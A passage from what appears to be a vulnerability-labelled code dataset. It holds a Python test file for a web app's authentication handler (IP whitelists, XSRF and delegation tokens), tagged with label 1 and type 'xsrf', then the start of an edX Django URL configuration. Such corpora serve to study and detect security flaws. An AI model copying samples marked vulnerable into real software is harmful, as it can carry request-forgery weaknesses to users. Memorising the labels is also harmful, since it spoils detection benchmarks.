'error',\n        lambda *args, **kwargs: self.logged_errors.append((args, kwargs)))\n    self.logged_warnings = []\n    self.mock(handler.logging, 'warning',\n        lambda *args, **kwargs: self.logged_warnings.append((args, kwargs)))\n\n  def make_test_app(self, path, request_handler):\n    \"\"\"Returns webtest.TestApp with single route.\"\"\"\n    return webtest.TestApp(\n        webapp2.WSGIApplication([(path, request_handler)], debug=True),\n        extra_environ={'REMOTE_ADDR': '127.0.0.1'})\n\n  def test_anonymous(self):\n    \"\"\"If all auth methods are not applicable, identity is set to Anonymous.\"\"\"\n    test = self\n\n    class Handler(handler.AuthenticatingHandler):\n      @classmethod\n      def get_auth_methods(cls, conf):\n        non_applicable = lambda _request: None\n        return [non_applicable, non_applicable]\n\n      @api.public\n      def get(self):\n        test.assertEqual(model.Anonymous, api.get_current_identity())\n        self.response.write('OK')\n\n    app = self.make_test_app('/request', Handler)\n    self.assertEqual('OK', app.get('/request').body)\n\n  def test_ip_whitelist_bot(self):\n    \"\"\"Requests from client in \"bots\" IP whitelist are authenticated as bot.\"\"\"\n    model.bootstrap_ip_whitelist('bots', ['192.168.1.100/32'])\n\n    class Handler(handler.AuthenticatingHandler):\n      @api.public\n      def get(self):\n        self.response.write(api.get_current_identity().to_bytes())\n\n    app = self.make_test_app('/request', Handler)\n    def call(ip):\n      api.reset_local_state()\n      return app.get('/request', extra_environ={'REMOTE_ADDR': ip}).body\n\n    self.assertEqual('bot:whitelisted-ip', call('192.168.1.100'))\n    self.assertEqual('anonymous:anonymous', call('127.0.0.1'))\n\n  def test_ip_whitelist(self):\n    \"\"\"Per-account IP whitelist works.\"\"\"\n    ident1 = model.Identity(model.IDENTITY_USER, 'a@example.com')\n    ident2 = model.Identity(model.IDENTITY_USER, 'b@example.com')\n\n    model.bootstrap_ip_whitelist('whitelist', ['192.168.1.100/32'])\n    model.bootstrap_ip_whitelist_assignment(ident1, 'whitelist')\n\n    mocked_ident = [None]\n\n    class Handler(handler.AuthenticatingHandler):\n      @classmethod\n      def get_auth_methods(cls, conf):\n        return [lambda _req: mocked_ident[0]]\n\n      @api.public\n      def get(self):\n        self.response.write('OK')\n\n    app = self.make_test_app('/request', Handler)\n    def call(ident, ip):\n      api.reset_local_state()\n      mocked_ident[0] = ident\n      response = app.get(\n          '/request', extra_environ={'REMOTE_ADDR': ip}, expect_errors=True)\n      return response.status_int\n\n    # IP is whitelisted.\n    self.assertEqual(200, call(ident1, '192.168.1.100'))\n    # IP is NOT whitelisted.\n    self.assertEqual(403, call(ident1, '127.0.0.1'))\n    # Whitelist is not used.\n    self.assertEqual(200, call(ident2, '127.0.0.1'))\n\n  def test_auth_method_order(self):\n    \"\"\"Registered auth methods are tested in order.\"\"\"\n    test = self\n    calls = []\n    ident = model.Identity(model.IDENTITY_USER, 'joe@example.com')\n\n    def not_applicable(request):\n      self.assertEqual('/request', request.path)\n      calls.append('not_applicable')\n      return None\n\n    def applicable(request):\n      self.assertEqual('/request', request.path)\n      calls.append('applicable')\n      return ident\n\n    class Handler(handler.AuthenticatingHandler):\n      @classmethod\n      def get_auth_methods(cls, conf):\n        return [not_applicable, applicable]\n\n      @api.public\n      def get(self):\n        test.assertEqual(ident, api.get_current_identity())\n        self.response.write('OK')\n\n    app = self.make_test_app('/request', Handler)\n    self.assertEqual('OK', app.get('/request').body)\n\n    # Both methods should be tried.\n    expected_calls = [\n      'not_applicable',\n      'applicable',\n    ]\n    self.assertEqual(expected_calls, calls)\n\n  def test_authentication_error(self):\n    \"\"\"AuthenticationError in auth method stops request processing.\"\"\"\n    test = self\n    calls = []\n\n    def failing(request):\n      raise api.AuthenticationError('Too bad')\n\n    def skipped(request):\n      self.fail('authenticate should not be called')\n\n    class Handler(handler.AuthenticatingHandler):\n      @classmethod\n      def get_auth_methods(cls, conf):\n        return [failing, skipped]\n\n      @api.public\n      def get(self):\n        test.fail('Handler code should not be called')\n\n      def authentication_error(self, err):\n        test.assertEqual('Too bad', err.message)\n        calls.append('authentication_error')\n        # pylint: disable=bad-super-call\n        super(Handler, self).authentication_error(err)\n\n    app = self.make_test_app('/request', Handler)\n    response = app.get('/request', expect_errors=True)\n\n    # Custom error handler is called and returned HTTP 401.\n    self.assertEqual(['authentication_error'], calls)\n    self.assertEqual(401, response.status_int)\n\n    # Authentication error is logged.\n    self.assertEqual(1, len(self.logged_warnings))\n\n  def test_authorization_error(self):\n    \"\"\"AuthorizationError in auth method is handled.\"\"\"\n    test = self\n    calls = []\n\n    class Handler(handler.AuthenticatingHandler):\n      @api.require(lambda: False)\n      def get(self):\n        test.fail('Handler code should not be called')\n\n      def authorization_error(self, err):\n        calls.append('authorization_error')\n        # pylint: disable=bad-super-call\n        super(Handler, self).authorization_error(err)\n\n    app = self.make_test_app('/request', Handler)\n    response = app.get('/request', expect_errors=True)\n\n    # Custom error handler is called and returned HTTP 403.\n    self.assertEqual(['authorization_error'], calls)\n    self.assertEqual(403, response.status_int)\n\n  def make_xsrf_handling_app(\n      self,\n      xsrf_token_enforce_on=None,\n      xsrf_token_header=None,\n      xsrf_token_request_param=None):\n    \"\"\"Returns webtest app with single XSRF-aware handler.\n\n    If generates XSRF tokens on GET and validates them on POST, PUT, DELETE.\n    \"\"\"\n    calls = []\n\n    def record(request_handler, method):\n      is_valid = request_handler.xsrf_token_data == {'some': 'data'}\n      calls.append((method, is_valid))\n\n    class Handler(handler.AuthenticatingHandler):\n      @api.public\n      def get(self):\n        self.response.write(self.generate_xsrf_token({'some': 'data'}))\n      @api.public\n      def post(self):\n        record(self, 'POST')\n      @api.public\n      def put(self):\n        record(self, 'PUT')\n      @api.public\n      def delete(self):\n        record(self, 'DELETE')\n\n    if xsrf_token_enforce_on is not None:\n      Handler.xsrf_token_enforce_on = xsrf_token_enforce_on\n    if xsrf_token_header is not None:\n      Handler.xsrf_token_header = xsrf_token_header\n    if xsrf_token_request_param is not None:\n      Handler.xsrf_token_request_param = xsrf_token_request_param\n\n    app = self.make_test_app('/request', Handler)\n    return app, calls\n\n  def mock_get_current_identity(self, ident):\n    \"\"\"Mocks api.get_current_identity() to return |ident|.\"\"\"\n    self.mock(handler.api, 'get_current_identity', lambda: ident)\n\n  def test_xsrf_token_get_param(self):\n    \"\"\"XSRF token works if put in GET parameters.\"\"\"\n    app, calls = self.make_xsrf_handling_app()\n    token = app.get('/request').body\n    app.post('/request?xsrf_token=%s' % token)\n    self.assertEqual([('POST', True)], calls)\n\n  def test_xsrf_token_post_param(self):\n    \"\"\"XSRF token works if put in POST parameters.\"\"\"\n    app, calls = self.make_xsrf_handling_app()\n    token = app.get('/request').body\n    app.post('/request', {'xsrf_token': token})\n    self.assertEqual([('POST', True)], calls)\n\n  def test_xsrf_token_header(self):\n    \"\"\"XSRF token works if put in the headers.\"\"\"\n    app, calls = self.make_xsrf_handling_app()\n    token = app.get('/request').body\n    app.post('/request', headers={'X-XSRF-Token': token})\n    self.assertEqual([('POST', True)], calls)\n\n  def test_xsrf_token_missing(self):\n    \"\"\"XSRF token is not given but handler requires it.\"\"\"\n    app, calls = self.make_xsrf_handling_app()\n    response = app.post('/request', expect_errors=True)\n    self.assertEqual(403, response.status_int)\n    self.assertFalse(calls)\n\n  def test_xsrf_token_uses_enforce_on(self):\n    \"\"\"Only methods set in |xsrf_token_enforce_on| require token validation.\"\"\"\n    # Validate tokens only on PUT (not on POST).\n    app, calls = self.make_xsrf_handling_app(xsrf_token_enforce_on=('PUT',))\n    token = app.get('/request').body\n    # Both POST and PUT work when token provided, verifying it.\n    app.post('/request', {'xsrf_token': token})\n    app.put('/request', {'xsrf_token': token})\n    self.assertEqual([('POST', True), ('PUT', True)], calls)\n    # POST works without a token, put PUT doesn't.\n    self.assertEqual(200, app.post('/request').status_int)\n    self.assertEqual(403, app.put('/request', expect_errors=True).status_int)\n    # Both fail if wrong token is provided.\n    bad_token = {'xsrf_token': 'boo'}\n    self.assertEqual(\n        403, app.post('/request', bad_token, expect_errors=True).status_int)\n    self.assertEqual(\n        403, app.put('/request', bad_token, expect_errors=True).status_int)\n\n  def test_xsrf_token_uses_xsrf_token_header(self):\n    \"\"\"Name of the header used for XSRF can be changed.\"\"\"\n    app, calls = self.make_xsrf_handling_app(xsrf_token_header='X-Some')\n    token = app.get('/request').body\n    app.post('/request', headers={'X-Some': token})\n    self.assertEqual([('POST', True)], calls)\n\n  def test_xsrf_token_uses_xsrf_token_request_param(self):\n    \"\"\"Name of the request param used for XSRF can be changed.\"\"\"\n    app, calls = self.make_xsrf_handling_app(xsrf_token_request_param='tok')\n    token = app.get('/request').body\n    app.post('/request', {'tok': token})\n    self.assertEqual([('POST', True)], calls)\n\n  def test_xsrf_token_identity_matters(self):\n    app, calls = self.make_xsrf_handling_app()\n    # Generate token for identity A.\n    self.mock_get_current_identity(\n        model.Identity(model.IDENTITY_USER, 'a@example.com'))\n    token = app.get('/request').body\n    # Try to use it by identity B.\n    self.mock_get_current_identity(\n        model.Identity(model.IDENTITY_USER, 'b@example.com'))\n    response = app.post('/request', expect_errors=True)\n    self.assertEqual(403, response.status_int)\n    self.assertFalse(calls)\n\n  def test_get_authenticated_routes(self):\n    class Authenticated(handler.AuthenticatingHandler):\n      pass\n\n    class NotAuthenticated(webapp2.RequestHandler):\n      pass\n\n    app = webapp2.WSGIApplication([\n      webapp2.Route('/authenticated', Authenticated),\n      webapp2.Route('/not-authenticated', NotAuthenticated),\n    ])\n    routes = handler.get_authenticated_routes(app)\n    self.assertEqual(1, len(routes))\n    self.assertEqual(Authenticated, routes[0].handler)\n\n  def test_get_peer_ip(self):\n    class Handler(handler.AuthenticatingHandler):\n      @api.public\n      def get(self):\n        self.response.write(ipaddr.ip_to_string(api.get_peer_ip()))\n\n    app = self.make_test_app('/request', Handler)\n    response = app.get('/request', extra_environ={'REMOTE_ADDR': '192.1.2.3'})\n    self.assertEqual('192.1.2.3', response.body)\n\n  def test_get_peer_host(self):\n    class Handler(handler.AuthenticatingHandler):\n      @api.public\n      def get(self):\n        self.response.write(api.get_peer_host() or '<none>')\n\n    app = self.make_test_app('/request', Handler)\n    def call(headers):\n      api.reset_local_state()\n      return app.get('/request', headers=headers).body\n\n    # Good token.\n    token = host_token.create_host_token('HOST.domain.com')\n    self.assertEqual('host.domain.com', call({'X-Host-Token-V1': token}))\n\n    # Missing or invalid tokens.\n    self.assertEqual('<none>', call({}))\n    self.assertEqual('<none>', call({'X-Host-Token-V1': 'broken'}))\n\n    # Expired token.\n    origin = datetime.datetime(2014, 1, 1, 1, 1, 1)\n    self.mock_now(origin)\n    token = host_token.create_host_token('HOST.domain.com', expiration_sec=60)\n    self.mock_now(origin, 61)\n    self.assertEqual('<none>', call({'X-Host-Token-V1': token}))\n\n  def test_delegation_token(self):\n    peer_ident = model.Identity.from_bytes('user:peer@a.com')\n\n    class Handler(handler.AuthenticatingHandler):\n      @classmethod\n      def get_auth_methods(cls, conf):\n        return [lambda _request: peer_ident]\n\n      @api.public\n      def get(self):\n        self.response.write(json.dumps({\n          'peer_id': api.get_peer_identity().to_bytes(),\n          'cur_id': api.get_current_identity().to_bytes(),\n        }))\n\n    app = self.make_test_app('/request', Handler)\n    def call(headers=None):\n      return json.loads(app.get('/request', headers=headers).body)\n\n    # No delegation.\n    self.assertEqual(\n        {u'cur_id': u'user:peer@a.com', u'peer_id': u'user:peer@a.com'}, call())\n\n    # TODO(vadimsh): Mint token via some high-level function call.\n    subtokens = delegation_pb2.SubtokenList(subtokens=[\n        delegation_pb2.Subtoken(\n            issuer_id='user:delegated@a.com',\n            creation_time=int(utils.time_time()),\n            validity_duration=3600),\n    ])\n    tok = delegation.serialize_token(delegation.seal_token(subtokens))\n\n    # With valid delegation token.\n    self.assertEqual(\n        {u'cur_id': u'user:delegated@a.com', u'peer_id': u'user:peer@a.com'},\n        call({'X-Delegation-Token-V1': tok}))\n\n    # With invalid delegation token.\n    r = app.get(\n        '/request',\n        headers={'X-Delegation-Token-V1': tok + 'blah'},\n        expect_errors=True)\n    self.assertEqual(403, r.status_int)\n\n    # Transient error.\n    def mocked_check(*_args):\n      raise delegation.TransientError('Blah')\n    self.mock(delegation, 'check_delegation_token', mocked_check)\n    r = app.get(\n        '/request',\n        headers={'X-Delegation-Token-V1': tok},\n        expect_errors=True)\n    self.assertEqual(500, r.status_int)\n\n\nclass GaeCookieAuthenticationTest(test_case.TestCase):\n  \"\"\"Tests for gae_cookie_authentication function.\"\"\"\n\n  def test_non_applicable(self):\n    self.assertIsNone(handler.gae_cookie_authentication(webapp2.Request({})))\n\n  def test_applicable(self):\n    os.environ.update({\n      'USER_EMAIL': 'joe@example.com',\n      'USER_ID': '123',\n      'USER_IS_ADMIN': '0',\n    })\n    # Actual request is not used by CookieAuthentication.\n    self.assertEqual(\n        model.Identity(model.IDENTITY_USER, 'joe@example.com'),\n        handler.gae_cookie_authentication(webapp2.Request({})))\n\n\nclass ServiceToServiceAuthenticationTest(test_case.TestCase):\n  \"\"\"Tests for service_to_service_authentication.\"\"\"\n\n  def test_non_applicable(self):\n    request = webapp2.Request({})\n    self.assertIsNone(\n        handler.service_to_service_authentication(request))\n\n  def test_applicable(self):\n    request = webapp2.Request({\n      'HTTP_X_APPENGINE_INBOUND_APPID': 'some-app',\n    })\n    self.assertEqual(\n      model.Identity(model.IDENTITY_SERVICE, 'some-app'),\n      handler.service_to_service_authentication(request))\n\n\nif __name__ == '__main__':\n  if '-v' in sys.argv:\n    unittest.TestCase.maxDiff = None\n  unittest.main()\n/n/n/n", "label": 1, "vtype": "xsrf"}, {"id": "5fad9ccca43cdfb565b3f80914f998afa7f2fa78", "code": "lms/urls.py/n/nfrom django.conf import settings\nfrom django.conf.urls import patterns, include, url\nfrom django.contrib import admin\nfrom django.conf.urls.static import static\n\n# Not used, the work is done in the imported module.\nfrom . import one_time_startup      # pylint: disable=W0611\n\nimport django.contrib.auth.views\n\n# Uncomment the next two lines to enable the admin:\nif settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):\n    admin.autodiscover()\n\nurlpatterns = ('',  # nopep8\n    # certificate view\n\n    url(r'^update_certificate$', 'certificates.views.update_certificate'),\n    url(r'^$', 'branding.views.index', name=\"root\"),   # Main marketing page, or redirect to courseware\n    url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"),\n    url(r'^login$', 'student.views.signin_user', name=\"signin_user\"),\n    url(r'^register$', 'student.views.register_user', name=\"register_user\"),\n\n    url(r'^admin_dashboard$', 'dashboard.views.dashboard'),\n\n    url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"),\n    url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'),\n    url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"),\n    url(r'^accept_name_change$', 'student.views.accept_name_change'),\n    url(r'^reject_name_change$', 'student.views.reject_name_change'),\n    url(r'^pending_name_changes$', 'student.views.pending_name_changes'),\n    url(r'^event$', 'track.views.user_track'),\n    url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'),   # TODO: Is this used anymore? What is STATIC_GRAB?\n\n    url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"),\n\n    url(r'^login_ajax$', 'student.views.login_user', name=\"login\"),\n    url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'),\n    url(r'^logout$', 'student.views.logout_user', name='logout'),\n    url(r'^create_account$', 'student.views.create_account', name='create_account'),\n    url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"),\n\n    url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"),\n    url(r'^create_exam_registration$', 'student.views.create_exam_registration'),\n\n    url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'),\n    ## Obsolete Django views for password resets\n    ## TODO: Replace with Mako-ized views\n    url(r'^password_change/$', django.contrib.auth.views.password_change,\n        name='auth_password_change'),\n    url(r'^password_change_done/$', django.contrib.auth.views.password_change_done,\n        name='auth_password_change_done'),\n    url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$',\n        'student.views.password_reset_confirm_wrapper',\n        name='auth_password_reset_confirm'),\n    url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete,\n        name='auth_password_reset_complete'),\n    url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done,\n        name='auth_password_reset_done'),\n\n    url(r'^heartbeat$', include('heartbeat.urls')),\n)\n\n# University profiles only make sense in the default edX context\nif not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n    urlpatterns += (\n        ##\n        ## Only universities without courses should be included here.  If\n        ## courses exist, the dynamic profile rule below should win.\n        ##\n        url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}),\n        url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'McGillX'}),\n        url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}),\n        url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}),\n        url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}),\n        url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}),\n\n        url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile',\n            name=\"university_profile\"),\n    )\n\n#Semi-static views (these need to be rendered and have the login bar, but don't change)\nurlpatterns += (\n    url(r'^404$', 'static_template_view.views.render',\n        {'template': '404.html'}, name=\"404\"),\n)\n\n# Semi-static views only used by edX, not by themes\nif not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n    urlpatterns += (\n        url(r'^jobs$', 'static_template_view.views.render',\n            {'template': 'jobs.html'}, name=\"jobs\"),\n        url(r'^press$', 'student.views.press', name=\"press\"),\n        url(r'^media-kit$', 'static_template_view.views.render',\n            {'template': 'media-kit.html'}, name=\"media-kit\"),\n        url(r'^faq$', 'static_template_view.views.render',\n            {'template': 'faq.html'}, name=\"faq_edx\"),\n        url(r'^help$', 'static_template_view.views.render',\n            {'template': 'help.html'}, name=\"help_edx\"),\n\n        # TODO: (bridger) The copyright has been removed until it is updated for edX\n        # url(r'^copyright$', 'static_template_view.views.render',\n        #     {'template': 'copyright.html'}, name=\"copyright\"),\n\n        #Press releases\n        url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'),\n\n        # Favicon\n        (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to', {'url': '/static/images/favicon.ico'}),\n\n        url(r'^submit_feedback$', 'util.views.submit_feedback'),\n\n    )\n\n# Only enable URLs for those marketing links actually enabled in the\n# settings. Disable URLs by marking them as None.\nfor key, value in settings.MKTG_URL_LINK_MAP.items():\n    # Skip disabled URLs\n    if value is None:\n        continue\n\n    # These urls are enabled separately\n    if key == \"ROOT\" or key == \"COURSES\" or key == \"FAQ\":\n        continue\n\n    # Make the assumptions that the templates are all in the same dir\n    # and that they all match the name of the key (plus extension)\n    template = \"%s.html\" % key.lower()\n\n    # To allow theme templates to inherit from default templates,\n    # prepend a standard prefix\n    if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n        template = \"theme-\" + template\n\n    # Make the assumption that the URL we want is the lowercased\n    # version of the map key\n    urlpatterns += (url(r'^%s' % key.lower(),\n                        'static_template_view.views.render',\n                        {'template': template}, name=value),)\n\n\nif settings.PERFSTATS:\n    urlpatterns += (url(r'^reprofile$', 'perfstats.views.end_profile'),)\n\n# Multicourse wiki (Note: wiki urls must be above the courseware ones because of\n# the custom tab catch-all)\nif settings.WIKI_ENABLED:\n    from wiki.urls import get_pattern as wiki_pattern\n    from django_notify.urls import get_pattern as notify_pattern\n\n    # Note that some of these urls are repeated in course_wiki.course_nav. Make sure to update\n    # them together.\n    urlpatterns += (\n        # First we include views from course_wiki that we use to override the default views.\n        # They come first in the urlpatterns so they get resolved first\n        url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'),\n        url(r'^wiki/', include(wiki_pattern())),\n        url(r'^notify/', include(notify_pattern())),\n\n        # These urls are for viewing the wiki in the context of a course. They should\n        # never be returned by a reverse() so they come after the other url patterns\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$',\n            'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"),\n        url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())),\n    )\n\n\nif settings.COURSEWARE_ENABLED:\n    urlpatterns += (\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$',\n            'courseware.views.jump_to', name=\"jump_to\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$',\n            'courseware.module_render.modx_dispatch',\n            name='modx_dispatch'),\n\n\n        # Software Licenses\n\n        # TODO: for now, this is the endpoint of an ajax replay\n        # service that retrieve and assigns license numbers for\n        # software assigned to a course. The numbers have to be loaded\n        # into the database.\n        url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$',\n            'courseware.module_render.xqueue_callback',\n            name='xqueue_callback'),\n        url(r'^change_setting$', 'student.views.change_setting',\n            name='change_setting'),\n\n        # TODO: These views need to be updated before they work\n        url(r'^calculate$', 'util.views.calculate'),\n        # TODO: We should probably remove the circuit package. I believe it was only used in the old way of saving wiki circuits for the wiki\n        # url(r'^edit_circuit/(?P<circuit>[^/]*)$', 'circuit.views.edit_circuit'),\n        # url(r'^save_circuit/(?P<circuit>[^/]*)$', 'circuit.views.save_circuit'),\n\n        url(r'^courses/?$', 'branding.views.courses', name=\"courses\"),\n        url(r'^change_enrollment$',\n            'student.views.change_enrollment', name=\"change_enrollment\"),\n\n        #About the course\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$',\n            'courseware.views.course_about', name=\"about_course\"),\n        #View for mktg site (kept for backwards compatibility TODO - remove before merge to master)\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$',\n            'courseware.views.mktg_course_about', name=\"mktg_about_course\"),\n        #View for mktg site\n        url(r'^mktg/(?P<course_id>.*)$',\n            'courseware.views.mktg_course_about', name=\"mktg_about_course\"),\n\n\n\n        #Inside the course\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'courseware.views.course_info', name=\"course_root\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$',\n            'courseware.views.course_info', name=\"info\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',\n            'courseware.views.syllabus', name=\"syllabus\"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/$',\n            'staticbook.views.index', name=\"book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n            'staticbook.views.index'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/(?P<page>\\d+)$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/$',\n            'staticbook.views.html_index', name=\"html_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n            'staticbook.views.html_index', name=\"html_book\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',\n            'courseware.views.index', name=\"courseware\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$',\n            'courseware.views.index', name=\"courseware_chapter\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$',\n            'courseware.views.index', name=\"courseware_section\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$',\n            'courseware.views.index', name=\"courseware_position\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$',\n            'courseware.views.progress', name=\"progress\"),\n        # Takes optional student_id for instructor use--shows profile as that student sees it.\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$',\n            'courseware.views.progress', name=\"student_progress\"),\n\n        # For the instructor\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$',\n            'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$',\n            'instructor.views.gradebook', name='gradebook'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$',\n            'instructor.views.grade_summary', name='grade_summary'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$',\n            'open_ended_grading.views.staff_grading', name='staff_grading'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$',\n            'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',\n            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',\n            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$',\n            'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'),\n\n        # Open Ended problem list\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$',\n            'open_ended_grading.views.student_problem_list', name='open_ended_problems'),\n\n        # Open Ended flagged problem list\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$',\n            'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$',\n            'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'),\n\n        # Cohorts management\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$',\n            'course_groups.views.list_cohorts', name=\"cohorts\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$',\n            'course_groups.views.add_cohort',\n            name=\"add_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$',\n            'course_groups.views.users_in_cohort',\n            name=\"list_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$',\n            'course_groups.views.add_users_to_cohort',\n            name=\"add_to_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$',\n            'course_groups.views.remove_user_from_cohort',\n            name=\"remove_from_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$',\n            'course_groups.views.debug_cohort_mgmt',\n            name=\"debug_cohort_mgmt\"),\n\n        # Open Ended Notifications\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$',\n            'open_ended_grading.views.combined_notifications', name='open_ended_notifications'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$',\n            'open_ended_grading.views.peer_grading', name='peer_grading'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')),\n\n    )\n\n    # allow course staff to change to student view of courseware\n    if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'):\n        urlpatterns += (\n            url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', 